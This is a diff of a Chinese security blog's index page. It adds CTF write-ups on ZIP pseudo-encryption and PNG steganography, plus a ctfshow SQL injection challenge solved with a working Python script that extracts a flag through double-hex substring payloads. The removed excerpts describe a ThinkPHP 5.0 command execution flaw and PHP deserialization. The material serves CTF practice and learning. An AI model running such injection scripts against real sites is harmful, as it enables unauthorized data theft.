@@ -160,6 +160,169 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-misc刷题记录" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/03/11/misc%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">misc刷题记录</a>
+    </h1>
+  
+
+        
+        
+<a href="/2021/03/11/misc%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" class="archive-article-date">
+  	<time datetime="2021-03-11T13:47:00.599Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-03-11</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="misc刷题记录"><a href="#misc刷题记录" class="headerlink" title="misc刷题记录"></a>misc刷题记录</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近刷了刷misc题，改变了自己原来对misc的看法，发现misc也超级有意思</p>
+<h2 id="BUGKU-赛博朋克"><a href="#BUGKU-赛博朋克" class="headerlink" title="BUGKU 赛博朋克"></a>BUGKU 赛博朋克</h2><p>下载附件，打开题目发现是一个压缩包有密码。</p>
+<p><img src="/2021/03/11/misc%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210303182852909.png" alt="image-20210303182852909"></p>
+<p>放到010editor里看一看。</p>
+<p><img src="/2021/03/11/misc%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210303183129043.png" alt="image-20210303183129043"></p>
+<p><img src="/2021/03/11/misc%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210303183150008.png" alt="image-20210303183150008"></p>
+<p>发现压缩源文件数据区和压缩源文件目录区的全局方式位标记不同（一个是0000,无加密，一个是0900,有加密），那么也就是伪加密了，将后者的0900改为0000。</p>
+<p>一个 ZIP 文件由三个部分组成： <strong>压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志</strong></p>
+<p>50 4B 03 04：这是头文件标记（0x04034b50）<br>14 00：解压文件所需 pkware 版本<br>00 00：全局方式位标记（有无加密）<br>08 00：压缩方式<br>BC A9：最后修改文件时间<br>33 52：最后修改文件日期<br>68 E0 0E 46：CRC-32校验<br>95 89 06 00：压缩后尺寸（25）<br>6D 89 06 00：未压缩尺寸（23）<br>0D 00：文件名长度<br>00 00：扩展记录长度</p>
+<p><img src="/2021/03/11/misc%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210303183314876.png" alt="image-20210303183314876"></p>
+<p>解压出来的<code>cyberpunk.txt</code>发现打开是乱码，但是看到了一个IHDR，应该是一个png文件。那么后面应该就是图片隐写了。</p>
+<p>用Stegsolve打开red、green、blue全调到最低发现flag。</p>
+<p><img src="/2021/03/11/misc%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210303184311383.png" alt="image-20210303184311383"></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/03/11/misc%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-ctfshow内部赛" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/03/11/ctfshow%E5%86%85%E9%83%A8%E8%B5%9B/">ctfshow内部赛</a>
+    </h1>
+  
+
+        
+        
+<a href="/2021/03/11/ctfshow%E5%86%85%E9%83%A8%E8%B5%9B/" class="archive-article-date">
+  	<time datetime="2021-03-11T13:47:00.597Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-03-11</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="ctfshow内部赛"><a href="#ctfshow内部赛" class="headerlink" title="ctfshow内部赛"></a>ctfshow内部赛</h1><h1 id="文章目录"><a href="#文章目录" class="headerlink" title="文章目录"></a>文章目录</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><h2 id="蓝瘦"><a href="#蓝瘦" class="headerlink" title="蓝瘦"></a>蓝瘦</h2><h2 id="出题人不想跟你说话-jpg"><a href="#出题人不想跟你说话-jpg" class="headerlink" title="出题人不想跟你说话.jpg"></a>出题人不想跟你说话.jpg</h2><h2 id="一览无余"><a href="#一览无余" class="headerlink" title="一览无余"></a>一览无余</h2><h2 id="登录就有flag"><a href="#登录就有flag" class="headerlink" title="登录就有flag"></a>登录就有flag</h2><h2 id="签退"><a href="#签退" class="headerlink" title="签退"></a>签退</h2><hr>
+<h2 id="签到-1"><a href="#签到-1" class="headerlink" title="签到"></a>签到</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>一道sql注入题目，只能说自己还有很多注入的姿势还没掌握。</p>
+<p>后来查资料看到了这题类似[网鼎杯 2018 unfinish]</p>
+<h3 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h3><p>进入环境用<code>dirsearch</code>扫了一下，发现有<code>login.php、register.php、www.zip、user.php</code></p>
+<p><img src="/2021/03/11/ctfshow%E5%86%85%E9%83%A8%E8%B5%9B/image-20210228123048630.png" alt="image-20210228123048630"></p>
+<p>就把源码下载了下来</p>
+<p>register.php：</p>
+<p><img src="/2021/03/11/ctfshow%E5%86%85%E9%83%A8%E8%B5%9B/image-20210228123159617.png" alt="image-20210228123159617"></p>
+<p>源码中对很多关键词都进行了过滤</p>
+<p>user.php：</p>
+<p><img src="/2021/03/11/ctfshow%E5%86%85%E9%83%A8%E8%B5%9B/image-20210228123744169.png" alt="image-20210228123744169"></p>
+<p>可以看到对用户名是否数字进行了判断，并且对长度进行了截取，会在返回值中返回<code>username</code>，所以我们就可以利用<code>username</code>进行回带值，注入点是在<code>register.php</code>传入的username中。</p>
+<h4 id="看一些sql语句"><a href="#看一些sql语句" class="headerlink" title="看一些sql语句"></a>看一些sql语句</h4><p><img src="/2021/03/11/ctfshow%E5%86%85%E9%83%A8%E8%B5%9B/image-20210228124937579.png" alt="image-20210228124937579"></p>
+<p>如果用了<code>hex</code></p>
+<p><img src="/2021/03/11/ctfshow%E5%86%85%E9%83%A8%E8%B5%9B/image-20210228125158298.png" alt="image-20210228125158298"></p>
+<p>但是还有个问题：</p>
+<p><img src="/2021/03/11/ctfshow%E5%86%85%E9%83%A8%E8%B5%9B/image-20210228125452752.png" alt="image-20210228125452752"></p>
+<p><img src="/2021/03/11/ctfshow%E5%86%85%E9%83%A8%E8%B5%9B/image-20210228125605735.png" alt="image-20210228125605735"></p>
+<p>可以发现<code>flag</code>在hex编码之后被截断了</p>
+<p>这个题要求的是纯数字，所以可以进行两次<code>hex</code>编码</p>
+<p><img src="/2021/03/11/ctfshow%E5%86%85%E9%83%A8%E8%B5%9B/image-20210228125903954.png" alt="image-20210228125903954"></p>
+<p>由于前面对<code>username</code>回带的长度进行了截取，所以我们只能一次十位回带<code>flag</code>。</p>
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url1 = <span class="string">"http://3c7fe459-38fe-472f-90e2-eb144496bd2c.chall.ctf.show:8080/register.php"</span></span><br><span class="line">url2 = <span class="string">"http://3c7fe459-38fe-472f-90e2-eb144496bd2c.chall.ctf.show:8080/login.php"</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    payload=<span class="string">"hex(hex(substr((select/**/flag/**/from/**/flag)from/**/"</span>+str(i)+<span class="string">"/**/for/**/1))),/*"</span></span><br><span class="line">    <span class="comment"># print(payload)</span></span><br><span class="line">    s=requests.session()</span><br><span class="line">    data1=&#123;</span><br><span class="line">        <span class="string">'e'</span>:str(i+<span class="number">30</span>)+<span class="string">"',username="</span>+payload,</span><br><span class="line">        <span class="string">'u'</span>:<span class="string">"*/#"</span>,</span><br><span class="line">        <span class="string">'p'</span>:i+<span class="number">30</span></span><br><span class="line">        &#125;</span><br><span class="line">    print(data1[<span class="string">'e'</span>])</span><br><span class="line">    r1 = s.post(url1,data=data1)  </span><br><span class="line">    data2=&#123;</span><br><span class="line">        <span class="string">'e'</span>:i+<span class="number">30</span>,</span><br><span class="line">        <span class="string">'p'</span>:i+<span class="number">30</span></span><br><span class="line">        &#125;</span><br><span class="line">    r2=s.post(url2,data=data2)</span><br><span class="line">    t =r2.text</span><br><span class="line">    real = re.findall(<span class="string">"Hello (.*?),"</span>,t)[<span class="number">0</span>]</span><br><span class="line">    flag+=real</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure>
+
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/03/11/ctfshow%E5%86%85%E9%83%A8%E8%B5%9B/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-算法学习" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -682,144 +845,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2020/11/27/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BF%A1%E6%81%AF%E7%9A%84%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-ThinkPHP5-x-远程命令执行漏洞分析与复现" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/10/31/ThinkPHP5-x-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/">ThinkPHP5.x 远程命令执行漏洞分析与复现</a>
-    </h1>
-  
-
-        
-        
-<a href="/2020/10/31/ThinkPHP5-x-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/" class="archive-article-date">
-  	<time datetime="2020-10-31T03:46:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-31</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="ThinkPHP-5-0命令执行漏洞分析与复现"><a href="#ThinkPHP-5-0命令执行漏洞分析与复现" class="headerlink" title="ThinkPHP 5.0命令执行漏洞分析与复现"></a>ThinkPHP 5.0命令执行漏洞分析与复现</h1><p>ThinkPHP 5.0版本是一个颠覆和重构版本，也是ThinkPHP十周年献礼版本，基于PHP5.4设计（完美支持PHP7），采用全新的架构思想，引入了很多的PHP新特性，优化了核心，减少了依赖，支持Composer，实现了真正的惰性加载，并且为API开发做了深入的支持，在功能、性能以及灵活性方面都较为突出。</p>
-<h2 id="0X01-漏洞描述"><a href="#0X01-漏洞描述" class="headerlink" title="0X01 漏洞描述"></a>0X01 漏洞描述</h2><p>ThinkPHP5.0在核心代码中实现了表单请求类型伪装的功能，该功能利用$_POST[‘_method’]变量来传递真实的请求方法，当攻击者设置_$POST[‘_method’]=__construct时，Request类的method方法便会将该类的变量进行覆盖，攻击者利用该方法将filter变量覆盖为system等函数名，当内部进行参数过滤时便会进行任意命令执行。</p>
-        
-          <a class="article-more-a" href="/2020/10/31/ThinkPHP5-x-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/10/31/ThinkPHP5-x-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-反序列化的学习" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/10/24/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%AD%A6%E4%B9%A0/">反序列化的学习</a>
-    </h1>
-  
-
-        
-        
-<a href="/2020/10/24/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%AD%A6%E4%B9%A0/" class="archive-article-date">
-  	<time datetime="2020-10-24T13:59:38.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-24</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="php的序列号与反序列化"><a href="#php的序列号与反序列化" class="headerlink" title="php的序列号与反序列化"></a>php的序列号与反序列化</h1><h2 id="0X00-序列化"><a href="#0X00-序列化" class="headerlink" title="0X00 序列化"></a>0X00 序列化</h2><p>serialize()函数将一个对象转换为字符串形式</p>
-<p>我们来看一下直接输出对象是什么效果的：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $name=<span class="string">"ghtwf01"</span>;</span><br><span class="line">	<span class="keyword">public</span> $age=<span class="string">"18"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	$a=<span class="keyword">new</span> test();</span><br><span class="line">	print_r($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>效果如下：</p>
-<p><img src="/2020/10/24/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201025114330014.png" alt="image-20201025114330014"></p>
-        
-          <a class="article-more-a" href="/2020/10/24/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%AD%A6%E4%B9%A0/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/10/24/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%AD%A6%E4%B9%A0/">展开全文 >></a>
         </p>
       
 
